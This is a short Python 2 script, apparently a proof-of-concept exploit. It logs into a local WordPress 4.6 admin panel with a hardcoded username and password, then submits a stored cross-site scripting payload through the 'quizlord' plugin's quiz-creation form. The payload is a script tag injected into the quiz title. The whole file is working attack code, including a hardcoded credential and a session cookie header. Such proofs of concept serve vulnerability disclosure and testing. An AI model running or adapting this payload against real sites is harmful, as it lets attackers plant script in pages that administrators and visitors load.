import mechanize
from bs4 import BeautifulSoup
import urllib2

browser = mechanize.Browser()
browser.set_handle_robots(False)

browser.open("http://localhost:8888/WordPress-4.6/wp-admin/")

#printing the title of the page to show my steps
print "\n" + ("# " + browser.title() + "\n")

browser.select_form("loginform")

browser.form['log'] = 'admin'
browser.form['pwd'] = 'hgxSk#Fmexnu0^v!#B'
browser.submit()


header = {'Host': 'localhost:8888',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Referer': 'http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord',
'Cookie': 'wordpress_295cdc576d46a74a4105db5d33654g45',
'Connection': 'close',
'Upgrade-Insecure-Requests': '1' ,
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length ': '188'}
data = "action=ql_insert&title=poc\"><script>alert(1)</script>&description=&time=0&numbtype=numerical&numbmark=&rightcolor=00FF00&wrongcolor=FF0000&showtype=paginated&addquiz=Save"
url = "http://localhost:8888/wordpress/wp-admin/admin.php?page=quizlord"

browser.open(url, data, header)


#printing the title of the page to show my steps
print "\n" + ("# " + browser.title() + "\n")
